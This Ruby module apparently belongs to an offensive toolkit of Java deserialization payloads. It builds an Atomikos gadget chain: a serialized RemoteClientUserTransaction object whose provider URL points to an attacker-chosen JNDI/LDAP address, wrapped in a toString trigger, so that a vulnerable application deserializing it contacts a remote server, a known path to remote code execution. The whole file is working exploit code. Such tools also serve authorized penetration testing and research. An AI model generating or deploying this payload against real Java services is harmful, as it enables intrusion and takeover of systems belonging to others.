
require_relative '../serialize'
require_relative 'util'

module Java
  module Serialize
    module Payloads
      module Atomikos
        def make_jta(jndiUrl)
          cl = Java::Serialize::JavaObject.new('Lcom/atomikos/icatch/jta/RemoteClientUserTransaction;', 'providerUrl_' => jndiUrl,
                                                                                                        'name_' => jndiUrl,
                                                                                                        'initialContextFactory_' => 'com.sun.jndi.ldap.LdapCtxFactory')

          Java::Serialize::Payloads::Util.make_tostring(cl)
        end

        module_function :make_jta
        end
    end
  end
end
